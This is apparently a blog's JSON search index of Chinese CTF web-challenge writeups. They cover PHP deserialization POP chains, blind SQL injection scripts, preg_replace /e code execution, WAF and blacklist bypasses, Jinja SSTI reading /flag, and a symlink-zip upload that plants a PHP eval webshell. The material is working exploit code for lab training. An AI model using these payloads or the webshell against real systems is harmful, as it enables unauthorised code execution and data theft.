[
  {
    "objectID": "1751958088",
    "permalink": "/post/serialize_01/",
    "title": "Serialize_01","content": "php反序列化 | 晨曦的个人小站\n反序列化中_wakeup的绕过_wakeup绕过-CSDN博客\n从一道ctf题看php原生类 | Ethe\u0026amp;rsquo;s blog\n__wakeup绕过\rcve-2016-7124\r影响范围：\nPHP5 \u0026amp;lt; 5.6.25 PHP7 \u0026amp;lt; 7.0.10 正常来说在反序列化过程中，会先调用 __wakeup() 方法再进行 unserilize 的操作，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，__wakeup()的执行会被跳过。\n地址赋值\r题目[UUCTF 2022 新生赛]ez_unser\n\u0026amp;lt;?php show_source(__FILE__); ###very___so___easy!!!! class test{ public $a; public $b; public $c; public function __construct(){ $this-\u0026amp;gt;a=1; $this-\u0026amp;gt;b=2; $this-\u0026amp;gt;c=3; } public function __wakeup(){ $this-\u0026amp;gt;a=\u0026amp;#39;\u0026amp;#39;; } public function __destruct(){ $this-\u0026amp;gt;b=$this-\u0026amp;gt;c; eval($this-\u0026amp;gt;a); } } $a=$_GET[\u0026amp;#39;a\u0026amp;#39;]; if(!preg_match(\u0026amp;#39;/test\u0026amp;#34;:3/i\u0026amp;#39;,$a)){ die(\u0026amp;#34;你输入的不正确！！！搞什么！！\u0026amp;#34;); } $bbb=unserialize($_GET[\u0026amp;#39;a\u0026amp;#39;]); poc\n\u0026amp;lt;?php class test{ public $a; public $b; public $c; public function __wakeup(){ $this-\u0026amp;gt;a=\u0026amp;#39;\u0026amp;#39;; } public function __destruct(){ $this-\u0026amp;gt;b=$this-\u0026amp;gt;c; eval($this-\u0026amp;gt;a); } } $a=new test; $a-\u0026amp;gt;a=\u0026amp;amp;$a-\u0026amp;gt;b; …","date": "2025-07-08 15:01:28",
    "updated": "2025-07-08 15:01:28"
  }, 
  {
    "objectID": "1751957355",
    "permalink": "/post/litctf2025-%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF/",
    "title": "Litctf2025-君の名は","content": "\r思路\r\u0026lt;?php highlight_file(__FILE__); error_reporting(0); create_function(\u0026#34;\u0026#34;, \u0026#39;die(`/readflag`);\u0026#39;); class Taki { private $musubi; private $magic; public function __unserialize(array $data) { $this-\u0026gt;musubi = $data[\u0026#39;musubi\u0026#39;]; $this-\u0026gt;magic = $data[\u0026#39;magic\u0026#39;]; return ($this-\u0026gt;musubi)(); } public function __call($func,$args){ (new $args[0]($args[1]))-\u0026gt;{$this-\u0026gt;magic}(); } } class Mitsuha { private $memory; private $thread; public function __invoke() { return $this-\u0026gt;memory.$this-\u0026gt;thread; } } class KatawareDoki { private $soul; private $kuchikamizake; private $name; public function __toString() { ($this-\u0026gt;soul)-\u0026gt;flag($this-\u0026gt;kuchikamizake,$this-\u0026gt;name); return \u0026#34;call error!no flag!\u0026#34;; } } $Litctf2025 = $_POST[\u0026#39;Litctf2025\u0026#39;]; if(!preg_match(\u0026#34;/^[Oa]:[\\d]+/i\u0026#34;, $Litctf2025)){ unserialize($Litctf2025); }else{ echo \u0026#34;把O改成C不就行了吗,笨蛋!～(∠・ω\u0026lt; )⌒☆\u0026#34;; } 首先分析攻击点\ncreate_function(\u0026#34;\u0026#34;, \u0026#39;die(`/readflag`);\u0026#39;); 这里create_function构造了一个匿名函数，执行该函数即可拿到flag 思路就清晰了 1、拿到匿名函数的函数名 2、执行该函数\n\u0026lt;?php $a=create_function(\u0026#34;\u0026#34;, \u0026#39;die(`/readflag`);\u0026#39;); echo urlencode($a); //\\00lambda_1 预期调用函数的方法\n(new $args[0]($args[1]))-\u0026gt;{$this-\u0026gt;magic}(); 翻php手册，需要找到一个原生类可以调用函数-\u0026gt;ReflectionFunction的invoke\n非预期调用函数\nreturn ($this-\u0026gt;musubi)(); bypass\nif(!preg_match(\u0026#34;/^[Oa]:[\\d]+/i\u0026#34;, $Litctf2025)) 题目也提示了换成C\nC绕过\r题解\r预期poc\r\u0026lt;?php class Taki { public $musubi; public $magic=\u0026#34;invoke\u0026#34;; } class Mitsuha { public $memory; public $thread; } class KatawareDoki { public $soul; public $kuchikamizake=\u0026#34;ReflectionFunction\u0026#34;; public $name=\u0026#34;\\00lambda_1\u0026#34;; } $a=new Taki; $b=new Mitsuha; $c=new KatawareDoki; $a-\u0026gt;musubi=$b; $b-\u0026gt;memory=$c; $c-\u0026gt;soul=$a; $aa=new ArrayObject($a); echo urlencode(serialize($aa)); ?\u0026gt; /// C%3A11%3A%22ArrayObject%22%3A227%3A%7Bx%3Ai%3A0%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A3%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7Ds%3A6%3A%22thread%22%3BN%3B%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%3Bm%3Aa%3A0%3A%7B%7D%7D 非预期\r\u0026lt;?php class Taki { public $musubi; public $magic; } $a=new Taki; $a-\u0026gt;musubi=\u0026#34;\\00lambda_1\u0026#34;; $aa=array(\u0026#34;evil\u0026#34;=\u0026gt;$a); $A=new ArrayObject($aa); echo urlencode(serialize($A));s ?\u0026gt; ///C%3A11%3A%22ArrayObject%22%3A90%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3Bs%3A9%3A%22%00lambda_1%22%3Bs%3A5%3A%22magic%22%3BN%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D ","date": "2025-07-08 14:49:15",
    "updated": "2025-07-08 14:49:15"
  }, 
  {
    "objectID": "1751351119",
    "permalink": "/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/",
    "title": "CISCN2019 华北赛区 Day2 Web1Hack_World","content": "题目很简单，主要是练习一下脚本，做下记录方便查阅\nexp\r枚举法\rimport requests import string url=\u0026#34;http://e57aa3be-d1dc-4ed4-a3a2-35878118c101.node5.buuoj.cn:81/index.php\u0026#34; flag=\u0026#34;\u0026#34; for i in range(1,100): for j in string.ascii_letters+string.digits+string.punctuation: data={ \u0026#34;id\u0026#34;:\u0026#34;if(substr((select(flag)from(flag)),{},1)=\u0026#39;{}\u0026#39;,1,0)\u0026#34;.format(i,j) } r=requests.post(url,data=data) if \u0026#34;Hello\u0026#34; in r.text: flag+=j print(flag) continue else: pass 二分法\rimport requests url=\u0026#34;http://e57aa3be-d1dc-4ed4-a3a2-35878118c101.node5.buuoj.cn:81/index.php\u0026#34; # select=\u0026#34;\u0026#34; result=\u0026#34;\u0026#34; for i in range(1,100): left=32 right=127 mid=(left+right)//2 while left\u0026lt;right: data={\u0026#34;id\u0026#34;:f\u0026#34;if(ascii(substr((select(flag)from(flag)),{i},1))\u0026gt;{mid},1,0)\u0026#34;} r=requests.post(url,data=data) if \u0026#34;Hello\u0026#34; in r.text: left=mid+1 else: right=mid mid=(left+right)//2 result+=chr(left) print(result) 时间盲注\rimport requests import string url=\u0026#34;http://47b3e9b9-1cba-42c3-9231-d5131f3a8df1.node5.buuoj.cn:81/index\u0026#34; flag=\u0026#34;\u0026#34; for i in range(1,100): for j in string.ascii_letters+string.digits+string.punctuation: try: data={\u0026#39;id\u0026#39;:f\u0026#34;if(substr((select(flag)from(flag)),{i},1)=\u0026#39;{j}\u0026#39;,sleep(2),0)\u0026#34;} r=requests.post(url=url,data=data,timeout=2) except: flag+=j print(flag) continue 时间二分法\rimport requests import string url=\u0026#34;http://47b3e9b9-1cba-42c3-9231-d5131f3a8df1.node5.buuoj.cn:81/index\u0026#34; flag=\u0026#34;\u0026#34; for i in range(1,100): left=32 right=127 mid=(left+right)//2 while left\u0026lt;right: try: data={\u0026#34;id\u0026#34;:f\u0026#34;if(ascii(substr((select(flag)from(flag)),{i},1))\u0026gt;{mid},0,sleep(2))\u0026#34;} r=requests.post(url=url,data=data,timeout=2) left=mid+1 except: right=mid mid=(left+right)//2 flag+=chr(left) print(flag) ","date": "2025-07-01 14:25:19",
    "updated": "2025-07-01 14:25:19"
  }, 
  {
    "objectID": "1751350767",
    "permalink": "/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/",
    "title": "网鼎杯 2018 Fakebook","content": "\r思路\rrobots.txt给出题目源码，访问下载，后缀去掉.bak\n题目源码\r\u0026amp;lt;?php class UserInfo { public $name = \u0026amp;#34;\u0026amp;#34;; public $age = 0; public $blog = \u0026amp;#34;\u0026amp;#34;; public function __construct($name, $age, $blog) { $this-\u0026amp;gt;name = $name; $this-\u0026amp;gt;age = (int)$age; $this-\u0026amp;gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-\u0026amp;gt;get($this-\u0026amp;gt;blog); } public function isValidBlog () { $blog = $this-\u0026amp;gt;blog; return preg_match(\u0026amp;#34;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\u0026amp;#34;, $blog); } } 给的这部分源码给到一个类，三个属性，还有一个对blog的正则匹配\n可以推断出这里代码对应join页面 关键代码分析\rfunction get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); …","date": "2025-07-01 14:19:27",
    "updated": "2025-07-01 14:19:27"
  }, 
  {
    "objectID": "1751288401",
    "permalink": "/post/preg_replace-e-rce/",
    "title": "Preg_replace E Rce","content": "\rpreg_replace /e漏洞分析\rtips\n/e 可执行模式，此为PHP专有参数，例如preg_replace函数。 preg_replace( string|array $pattern, string|array $replacement, string|array $subject, ) /e模式下 在subject字符中正则匹配pattern，匹配成功则执行$replacement \u0026lt;?php echo preg_replace(\u0026#34;/test/e\u0026#34;,$_GET[\u0026#34;h\u0026#34;],\u0026#34;jutst test\u0026#34;); ?\u0026gt; 高版本中不支持preg_replace函数 payload中;不加也行 php可变变量\r这里补充一下php可变变量这个知识点\n\u0026lt;?php $change_name = \u0026#39;hello\u0026#39;; $hello = \u0026#39;Hello World\u0026#39;; echo $$change_name; //echo $hello ?\u0026gt; 再看下边的例子\n\u0026lt;?php $a = \u0026#39;hello\u0026#39;; $$a = \u0026#39;world\u0026#39;; //$hello=world echo \u0026#34;$a $hello\u0026#34;; echo \u0026#34;$a ${$a}\u0026#34;; //$a $hello echo \u0026#39;${$a}\u0026#39;; //单引号不解析原样输出${$a} ?\u0026gt; 进阶玩法\r\u0026lt;?php error_reporting(0); function complexStrtolower($regex, $value){ return preg_replace(\u0026#39;/(\u0026#39;.$regex.\u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $value); } foreach($_REQUEST as $regex =\u0026gt; $value){ echo complexStrtolower($regex, $value) . \u0026#34;\\n\u0026#34;; } highlight_file(__FILE__); ?\u0026gt; 分析一下这段代码\nreturn preg_replace(\u0026#39;/(\u0026#39;.$regex.\u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $value); /e模式下可命令执行，$replacement不再由用户控制\n关键在于\nstrtolower(\u0026#34;\\\\1\u0026#34;) 因为字符串中的特殊字符需要转义， 所以 \\\\1 实际上就是 \\1 , 而 \\1在正则表达式中表示反向引用。 反向引用： 对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从1开始，最多可存储99个捕获的子表达式。每个缓冲区都可以使用 \\n访问，其中n为一个标识特定缓冲区的一位或两位十进制数。 所以最终 \\1 就捕获到了 {${phpinfo()}}, 所以最终 strtolower(\u0026quot;{${phpinfo()}}\u0026quot;) 就被当做代码执行了。\n例题\r[BJDCTF2020]ZJCTF，不过如此\n前边考点是php伪协议读取文件\n?text=data:text/plain,I%20have%20a%20dream\u0026amp;file=php://filter/convert.base64-encode/resource=next.php 源码如下\n\u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;id\u0026#39;] = $id; function complex($re, $str) { return preg_replace(\u0026#39;/(\u0026#39; . $re . \u0026#39;)/ei\u0026#39;,\u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;,$str); } foreach($_GET as $re =\u0026gt; $str) { echo complex($re, $str). \u0026#34;\\n\u0026#34;; } function getFlag(){ @eval($_GET[\u0026#39;cmd\u0026#39;]); } 根据以上的分析\n?.*={${getFlag()}}\u0026amp;cmd=system(\u0026#39;ls\u0026#39;); 但是由于php解析特性第一个.无法传输，php解析特性的姿势可以看我博客\nIscc 2025_基本功 | Lier\nRoarCTF 2019_EasyCalc | Lier\n可以通过get_defined_vars()看一下被解析后的参数\n这里我们换另外的\n[\\s]表示，只要出现空白就匹配 [\\S]表示，非空白就匹配 最终payload，注意要在next.php的路由下\n?\\S*=${getFlag()}\u0026amp;cmd=system(\u0026#39;cat /flag\u0026#39;); 其他姿势\n?\\S*=${eval($_POST[pass])} ","date": "2025-06-30 21:00:01",
    "updated": "2025-06-30 21:00:01"
  }, 
  {
    "objectID": "1751208870",
    "permalink": "/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/",
    "title": "网鼎杯 2020 朱雀组 Phpweb","content": "\r思路\r1、抓包参数一个为date一个为Y-m-d h:i:s a\r注意到第一个参数为函数名，第二个参数为函数的参数\n2、这里很多函数被ban，尝试不同函数读取index.php\rinclude()+伪协议 file_get_contents() readfile() readgzfile() 这里尝试读取没有在常见位置读到flag\n题目源码\n\u0026lt;?php $disable_fun = array(\u0026#34;exec\u0026#34;,\u0026#34;shell_exec\u0026#34;,\u0026#34;system\u0026#34;,\u0026#34;passthru\u0026#34;,\u0026#34;proc_open\u0026#34;,\u0026#34;show_source\u0026#34;,\u0026#34;phpinfo\u0026#34;,\u0026#34;popen\u0026#34;,\u0026#34;dl\u0026#34;,\u0026#34;eval\u0026#34;,\u0026#34;proc_terminate\u0026#34;,\u0026#34;touch\u0026#34;,\u0026#34;escapeshellcmd\u0026#34;,\u0026#34;escapeshellarg\u0026#34;,\u0026#34;assert\u0026#34;,\u0026#34;substr_replace\u0026#34;,\u0026#34;call_user_func_array\u0026#34;,\u0026#34;call_user_func\u0026#34;,\u0026#34;array_filter\u0026#34;, \u0026#34;array_walk\u0026#34;, \u0026#34;array_map\u0026#34;,\u0026#34;registregister_shutdown_function\u0026#34;,\u0026#34;register_tick_function\u0026#34;,\u0026#34;filter_var\u0026#34;, \u0026#34;filter_var_array\u0026#34;, \u0026#34;uasort\u0026#34;, \u0026#34;uksort\u0026#34;, \u0026#34;array_reduce\u0026#34;,\u0026#34;array_walk\u0026#34;, \u0026#34;array_walk_recursive\u0026#34;,\u0026#34;pcntl_exec\u0026#34;,\u0026#34;fopen\u0026#34;,\u0026#34;fwrite\u0026#34;,\u0026#34;file_put_contents\u0026#34;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \u0026#34;string\u0026#34;) { return $result; } else {return \u0026#34;\u0026#34;;} } class Test { var $p = \u0026#34;Y-m-d h:i:s a\u0026#34;; var $func = \u0026#34;date\u0026#34;; function __destruct() { if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { echo gettime($this-\u0026gt;func, $this-\u0026gt;p); } } } $func = $_REQUEST[\u0026#34;func\u0026#34;]; $p = $_REQUEST[\u0026#34;p\u0026#34;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\u0026#34;Hacker...\u0026#34;); } } ?\u0026gt; 3、unserialize函数可用，反序列化-\u0026gt;RCE找到flag的位置\rpoc:\n\u0026lt;?php class Test { var $p = \u0026#34;find / -name flag*\u0026#34;; var $func = \u0026#34;system\u0026#34;; // function __destruct() { // if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { // echo gettime($this-\u0026gt;func, $this-\u0026gt;p); // } // } } $a=serialize(new Test); echo $a; ?\u0026gt; 不用想,肯定读取/tmp/下的flag文件\n4、找到后再读取就行\r姿势二\r\\system可以直接rce ","date": "2025-06-29 22:54:30",
    "updated": "2025-06-29 22:54:30"
  }, 
  {
    "objectID": "1750763277",
    "permalink": "/post/iscc-2025_%E5%9F%BA%E6%9C%AC%E5%8A%9F/",
    "title": "Iscc 2025_基本功","content": "\rIscc 2025_基本功\r打开题目\n告诉我们关键点是输入正确的“用户代理”身份标识与英雄名称，很容易联想到是不是修改User-Agent。\n我们直接在当前页面修改一下试试，发现直接跳转到Process.php页面，并且显示黑客入侵无处不在！！！在这里输入信息是没用的！！！\n回到首页面随便输入点东西，发现也是跳转到这个页面。并且通过尝试发现题目给的EBaLeiKeDun，EBaLeiKeDun，ShengLingShiZheLeiKeDun都用不了。又想起关键点是身份标识和英雄名称，这里的身份标识有可能是后面的堡垒卫士、超频战士之类的\n那尝试在UA处写上BaoLeiWeiShiLeiKeDunbao（堡垒卫士雷克顿）\n但是发现还是没用\n再仔细查看题目信息，注意到一个小细节，心想这位是“计算机行业”的专家，给出的英雄里只有高级工程师跟计算机有点关系。\n那尝试在UA写入GaoJiGongChengShiFoYeGe\n得到一个新的php文件，访问它，发现得到了一段源码\n\u0026amp;lt;?php show_source(__FILE__); include(\u0026amp;#39;E8sP4g7UvT.php\u0026amp;#39;); $a=$_GET[\u0026amp;#39;huigui_jibengong.1\u0026amp;#39;]; $b=$_GET[\u0026amp;#39;huigui_jibengong.2\u0026amp;#39;]; $c=$_GET[\u0026amp;#39;huigui_jibengong.3\u0026amp;#39;]; $jiben = is_numeric($a) and preg_match(\u0026amp;#39;/^[a-z0-9]+$/\u0026amp;#39;,$b); if($jiben==1) { if(intval($b) == \u0026amp;#39;jibengong\u0026amp;#39;) { if(strpos($b, \u0026amp;#34;0\u0026amp;#34;)==0) { echo \u0026amp;#39;基本功不够扎实啊！\u0026amp;#39;; echo \u0026amp;#39;\u0026amp;lt;br\u0026amp;gt;\u0026amp;#39;; echo \u0026amp;#39;还得再练！\u0026amp;#39;; } else { $$c = $a; parse_str($b,$huiguiflag); if($huiguiflag[$jibengong]==md5($c)) { echo $flag; } else{ echo \u0026amp;#39;基本功不够扎实啊！\u0026amp;#39;; echo …","date": "2025-06-24 19:07:57",
    "updated": "2025-06-24 19:07:57"
  }, 
  {
    "objectID": "1750433820",
    "permalink": "/post/suctf-2019_easysql/",
    "title": "SUCTF 2019_EasySQL","content": "\r思路\r1、ban了很多东西-关键是and or \u0026amp;\u0026amp; ||等连接词、^可以用 2、or误伤了information_schema,经过多次尝试发现限制了长度，意味着报错和盲注都无法进行，应该意识到是堆叠注入\n1;show tables; 3、ban了Flag,无法用handler语句；ban了from,无法用预处理\n4、题目突破点在于Give me your flag, I will tell you if the flag is right. 猜测后端源码为\nselect $_POST[\u0026#39;query\u0026#39;] || flog from Flag; 解法一\rpyaload\nquery= *,1 解法二\rtips mysql的全局变量sql_mode，为PIPES_AS_CONCAT 会将||认为字符串的连接符，而不是或运算符，这时||符号就像concat函数一样。 则payload为\n1;set sql_mode=PIPES_AS_CONCAT;select 1 ","date": "2025-06-20 23:37:00",
    "updated": "2025-06-20 23:37:00"
  }, 
  {
    "objectID": "1750433316",
    "permalink": "/post/roarctf-2019_easycalc/",
    "title": "RoarCTF 2019_EasyCalc","content": "\r思路\r1、前端源码提示WAF和calc.php\n2、访问calc.php,题目代码\n\u0026lt;?php error_reporting(0); if(!isset($_GET[\u0026#39;num\u0026#39;])){ show_source(__FILE__); }else{ $str = $_GET[\u0026#39;num\u0026#39;]; $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;,\u0026#39;\\$\u0026#39;,\u0026#39;\\\\\u0026#39;,\u0026#39;\\^\u0026#39;]; foreach ($blacklist as $blackitem) { if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $str)) { die(\u0026#34;what are you want to do?\u0026#34;); } } eval(\u0026#39;echo \u0026#39;.$str.\u0026#39;;\u0026#39;); } ?\u0026gt; 题目代码很简单，但是存在WAF\n解题\rWAF绕过\r通过测试发现WAF针对num变量过滤了字符，只能传数字 这里通过php字符串解析特性来bypass php正常通过$_GET和$_POST接受参数时会做两件事\n1.删除前后的空白符（空格符，制表符，换行符等统称为空白符） 2.将某些字符转换为下划线（包括空格） WAF或是IDS/IPS等防护设备中对该流量分析时基于自己的方式接受数据 此时如果传入?%20num=,WAF认为该参数名为%20num,但是php代码确实接受到了所传的数据，就达到了绕过WAF的效果\nRCE\r传入?%20num=shell_exec('ls')没有触发,可能ban了函数\n传入?%20num=phpinfo(),全局搜索disable_functions\nban了这么多命令执行的函数，直接考虑代码执行\n代码执行\r总结一下常用的函数\nvar_dump() print_r() scandir() getcwd() //相当与pwd getenv() //相当与env file_get_contents() highlight_file() show_source() read_file() readgzfile() chr() 当前目录没有，那就scandir根目录 /被ban了，这里用chr()函数bypass\nphp \u0026gt; var_dump(chr(47)); string(1) \u0026#34;/\u0026#34; 发现f1agg文件，读取文件，用file_get_contents搭配chr读取文件\n?%20num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))); 这里练习一下脚本，把所有数字嵌套上chr,这道题比较短，有长的，手工敲就不方便了\n\u0026lt;?php $a=\u0026#34;47 102 49 97 103 103\u0026#34;; function all_chr($a){ $arr=explode(\u0026#34; \u0026#34;,$a); for($i=0;$i\u0026lt;count($arr);$i++){$arr[$i]=\u0026#34;chr($arr[$i])\u0026#34;;} return join(\u0026#34;.\u0026#34;,$arr); } echo all_chr($a); ?\u0026gt; ","date": "2025-06-20 23:28:36",
    "updated": "2025-06-20 23:28:36"
  }, 
  {
    "objectID": "1750344318",
    "permalink": "/post/%E6%9C%AC%E7%AB%99%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/",
    "title": "本站食用指南","content": "\r首页\r三大类\nCTF-Great 收集一些比较好的题目\nwriteup 比赛writeup记录和靶场记录\nLeading 网络安全学习\n侧边栏和归档\r这两处作用相同，进行分类、归档\n配有标签，方便食用 其他\r其他就不废话了，md，突然感觉一篇都是废话，一句话，欢迎订阅和打赏\n搜索栏 评论 关灯 啥的 ","date": "2025-06-19 22:45:18",
    "updated": "2025-06-19 22:45:18"
  }, 
  {
    "objectID": "1750219200",
    "permalink": "/post/ciscn_unzip/",
    "title": "CISCN-2023 Unzip","content": "\runzip\r题目源码\n\u0026lt;?php error_reporting(0); highlight_file(__FILE__); $finfo = finfo_open(FILEINFO_MIME_TYPE); if (finfo_file($finfo, $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]) === \u0026#39;application/zip\u0026#39;){ exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; unzip -o \u0026#39; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); }; //only this! 分析\r关键代码\nexec(\u0026#39;cd /tmp \u0026amp;\u0026amp; unzip -o \u0026#39; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); // -o参数：如有同名的文件直接覆盖 上传.zip文件后 1、验证MIME值、是否为.zip文件 2、先cd /tmp目录，之后解压文件\n解题的关键在于上传的文件在/tmp目录下，上传的马无法访问 tips： 软连接：可以将某个目录连接到另一个目录或者文件下，那么我们以后对这个目录的任何操作，都会作用到另一个目录或者文件下。\n查询unzip相关的资料，发现了这个命令可以与软连接挂钩\n思路\r先上传一个软连接的压缩包，解压后指向-\u0026gt;/var/www/html/ 后上传一个有软连接和马的压缩包，解压后可在线访问 1、创建软连接并压缩\nmkdir hh cd hh ln -s /var/www/html link zip --symlinks link.zip link 2、删除原有的link软连接，创建与软连接同名的link文件夹，在link文件夹内写马,最后压缩\nrm link mkdir link cd link echo \u0026#34;\u0026lt;?php echo 123;eval($_POST[0]);?\u0026gt;\u0026#34; \u0026gt; shell.php cd .. zip -r link1.zip ./link ls 3、依次上传link.zip和link1.zip,访问url/shell.php\n","date": "2025-06-18 12:00:00",
    "updated": "2025-06-18 12:00:00"
  }, 
  {
    "objectID": "1750219200",
    "permalink": "/post/php_server/",
    "title": "PHP server源码泄露漏洞复现","content": "\rPHP server源码泄露漏洞复现\rphp＜= 7 . 4 . 21 development server源码泄露漏洞复现 - 凪白Kw - 博客园\nphp＜= 7 . 4 . 21 通过php -S开起的内置WEB服务器存在源码泄露漏洞 poc\nGET /phpinfo.php HTTP/1.1 Host: pd.research \\r\\n \\r\\n GET / HTTP/1.1 \\r\\n ps：这里一定要换行 一定能要关闭自动更新Content-Length\n这里我们稍微解释一下第一个GET和第二个GET的作用分别是什么 第一个GET后的/phpinfo.php是直接访问已存在的phpinfo.php文件(一般可以是访问index.php) PHP源码中的php_cli_server_request_translate_vpath函数将请求的PHP文件的路径转换为文件系统上的完整路径。如果请求的文件是一个目录，它会检查是否存在索引文件，如index.php或 index.html，并使用其中一个文件的路径(如果找到的话)。这允许服务器响应请求提供正确的文件 而第二个GET后的/请求的是目录而不是文件。此PHP版本提供的代码包括一个检查，以确定请求的文件是应被视为静态文件还是作为PHP文件执行。这是通过检查文件的扩展名来完成的。如果扩展不是.php或.PHP，或者如果扩展名的长度不等于3,则该文件被视为静态文件，因此如果我们把第二个GET请求的内容改为类似1.txt的文件时，php源码将会被以静态文件的方式泄露(即直接访问获取)\n","date": "2025-06-18 12:00:00",
    "updated": "2025-06-18 12:00:00"
  }, 
  {
    "objectID": "1748102400",
    "permalink": "/post/litctf/",
    "title": "LitCTF-2025","content": "\rLitCTF\r队伍信息\nweb\rnest_js\r爆破账号密码，admin:password\n登入就有flag\n星愿信箱\r过滤了{{的ssti\n多重宇宙日记\r注册账号a,a,登入在个人资料处看源代码\n// 更新表单的JS提交 document.getElementById(\u0026amp;#39;profileUpdateForm\u0026amp;#39;).addEventListener(\u0026amp;#39;submit\u0026amp;#39;, async function(event) { event.preventDefault(); const statusEl = document.getElementById(\u0026amp;#39;updateStatus\u0026amp;#39;); const currentSettingsEl = document.getElementById(\u0026amp;#39;currentSettings\u0026amp;#39;); statusEl.textContent = \u0026amp;#39;正在更新...\u0026amp;#39;; const formData = new FormData(event.target); const settingsPayload = {}; // 构建 settings 对象，只包含有值的字段 if (formData.get(\u0026amp;#39;theme\u0026amp;#39;)) settingsPayload.theme = formData.get(\u0026amp;#39;theme\u0026amp;#39;); if (formData.get(\u0026amp;#39;language\u0026amp;#39;)) settingsPayload.language = formData.get(\u0026amp;#39;language\u0026amp;#39;); // ...可以添加其他字段 try { const response = await fetch(\u0026amp;#39;/api/profile/update\u0026amp;#39;, { method: \u0026amp;#39;POST\u0026amp;#39;, headers: { \u0026amp;#39;Content-Type\u0026amp;#39;: \u0026amp;#39;application/json\u0026amp;#39;, }, body: JSON.stringify({ settings: settingsPayload }) // 包装在 \u0026amp;#34;settings\u0026amp;#34;键下 }); const result = …","date": "2025-05-25 00:00:00",
    "updated": "2025-05-25 00:00:00"
  }, 
  {
    "objectID": "1747670400",
    "permalink": "/post/%E8%BD%A9%E8%BE%95%E6%9D%AF-2025/",
    "title": "轩辕杯 2025","content": "\rezflask\r过滤.\n用中括号代替\n构造payload\n?name={{\u0026#39;\u0026#39;[\u0026#34;__class__\u0026#34;][\u0026#34;__base__\u0026#34;][\u0026#34;__subclasses__\u0026#34;]()[133][\u0026#34;__init__\u0026#34;][\u0026#34;__globals__\u0026#34;][request[\u0026#34;args\u0026#34;][\u0026#34;a\u0026#34;]](request[\u0026#34;args\u0026#34;][\u0026#34;b\u0026#34;])[\u0026#39;read\u0026#39;]()}}\u0026amp;a=popen\u0026amp;b=cat /flag ezJS\r看源码直接发包\nif (scoreNow === 100000000000) { fetch(\u0026#39;getflag.php\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, body: \u0026#39;score=\u0026#39; + scoreNow }) .then(response =\u0026gt; response.text()) .then(data =\u0026gt; { alert(\u0026#34;恭喜你！flag是：\u0026#34; + data); }) .catch(error =\u0026gt; { console.error(\u0026#39;错误:\u0026#39;, error); }); } }) ezssrf\r考点在于满足下式\n$x[\u0026#39;host\u0026#39;] === null \u0026amp;\u0026amp; $x[\u0026#39;scheme\u0026#39;] === \u0026#39;http\u0026#39; paylaod:\n?url=http:/127.0.0.1/flag 访问\n签到\r写一下关键过程\npayload\n?cmd=nl+%2Fflag%3f ezRCE\rreadgzfile\nezSQL\r过滤空格+select\n内联注释+双写\n得到flag后base64解码\nexp:\nimport requests import time #http://27.25.151.26:4925/?id=1/**/and/**/(if(ascii(substr((seselectlect/**/group_concat(schema_name)/**/from/**/information_schema.schemata),1,1))\u0026gt;32,1,0)) url=\u0026#34;http://27.25.151.26:4925/\u0026#34; 